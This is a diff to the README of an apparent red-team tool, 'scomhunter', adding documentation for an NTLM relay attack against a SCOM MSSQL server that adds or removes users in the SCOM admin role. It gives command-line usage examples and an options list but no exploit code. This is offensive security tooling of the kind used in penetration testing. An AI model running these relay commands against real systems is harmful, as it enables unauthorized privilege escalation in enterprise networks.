@@ -38,9 +38,40 @@ Usage: scomhunter [OPTIONS] COMMAND [ARGS]...
 ╭─ Commands ────────────────────────────────────────────────────────────────────────────────╮
 │ find    Enumerate LDAP for SCOM assets.                                                   │
 │ http    SCOM Web Console NTLM Relay Attack                                                │
-│ mssql   Convert provided sid to hex format and return MSSQL query                         │
+│ mssql   SCOM MSSQL NTLM Relay Attack - Manipulate SCOM admin role membership              │
 │ dpapi   Extract DPAPI Protected RunAs Credentials                                         │
 ╰───────────────────────────────────────────────────────────────────────────────────────────╯
+
+## MSSQL Relay Attack
+
+The `mssql` command performs an NTLM relay attack against a SCOM MSSQL database server. It sets up a relay server that waits for incoming authentication, relays it to the target MSSQL server, and executes SQL queries to manipulate the SCOM admin role membership.
+
+### Usage Examples
+
+```bash
+# Add a user to SCOM admin role (default operation)
+scomhunter mssql -t mssql.corp.com -s S-1-5-21-xxx-xxx-xxx-1234
+
+# Remove a user from SCOM admin role
+scomhunter mssql -t mssql.corp.com -s S-1-5-21-xxx-xxx-xxx-1234 -d
+
+# List current members of SCOM admin role
+scomhunter mssql -t mssql.corp.com -l
+
+# Use custom listening interface and port
+scomhunter mssql -t 192.168.1.10:1433 -s S-1-5-21-xxx-xxx-xxx-1234 -i 192.168.1.50 -p 8445
+```
+
+### Options
+
+- `-t, --target` - Target MSSQL server (required)
+- `-s, --sid` - SID of user to add/remove (required for update/delete operations)
+- `-i, --interface` - Interface to listen on (default: 0.0.0.0)
+- `-p, --port` - Port to listen on for incoming SMB connections (default: 445)
+- `-u, --update` - Add user to SCOM admin role (default operation)
+- `-d, --delete` - Remove user from SCOM admin role
+- `-l, --list` - List current members of SCOM admin role
+- `-v, --verbose` - Enable verbose logging
 
 ```
 # References
